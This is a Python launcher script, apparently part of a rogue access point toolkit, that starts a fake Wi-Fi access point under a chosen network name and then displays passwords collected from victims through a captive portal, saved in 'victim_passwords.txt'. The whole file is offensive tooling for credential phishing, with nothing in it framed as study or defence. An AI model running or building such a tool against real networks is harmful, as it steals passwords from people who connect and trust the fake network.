import sys
import os

import tools
from FakeAP import FakeAP
from pretty_print import pretty
# from tools import nics_from_ifconfig, choose_interface, choose_ssid

if __name__ == "__main__":
    os.system('clear')
    title = f'===============================================================\n' \
            f'============= ROGUE AP ATTACK (FAKE ACCESS POINT) =============\n' \
            f'===============================================================\n'
    pretty(title)
    interface = None
    ssid = None
    ifaces = tools.nics_from_ifconfig()

    if len(sys.argv) >= 2:
        if sys.argv[1] in ifaces:
            interface = sys.argv[1]
            pretty(f'\nNetwork interface selected: {interface}\n')
        else:
            print(f'No such network interface: {sys.argv[1]}')
    if len(sys.argv) >= 3:
        ssid = sys.argv[2]
        pretty(f'\nNetwork name(SSID): {ssid}\n')
    elif len(sys.argv) > 3:
        print(f'Usage: sudo python3 rogue_ap.py <interface-name> <ap-name>')

    if interface is None:
        # Get network interface name from user
        interface = tools.choose_interface()
        print(f'interface selected: {interface}\n')

    if ssid is None:
        # Get network name (SSID) from user
        ssid = tools.choose_ssid()
        print(f'SSID selected: {ssid}\n')

    os.system('clear')
    title = f'============= READY TO CREATE A FAKE ACCESS POINT =============\n' \
            f'\n * Network interface chosen: {interface}\n' \
            f'\n * Fake AP Name (SSID): \"{ssid}\"\n' \
            f'\n===============================================================\n'
    pretty(title)
    pretty('Press Enter to start the Fake Access Point!')
    fake_ap = FakeAP(interface_name=interface, ssid=ssid)  # Construct the (fake) wireless access point
    fake_ap.start()  # Start the Fake AP!

    fake_ap.ap.join()  # Wait for the AP to shut down

    with open('victim_passwords.txt', 'r') as captive_port_results:

        res = [line for line in captive_port_results.readlines()]
        size = len(res)
        if size > 0:
            pretty(f'The Fake Access Point have brought some results!!\n\nWould you like to check them out now? [y/n] ')
            show_res = input()
            if 'y' in show_res:
                for r in res:
                    print(r)
            else:
                pretty(f'\nOk... You can always check your results in \"victim_passwords.txt\" file!')
        captive_port_results.close()
    exit(0)
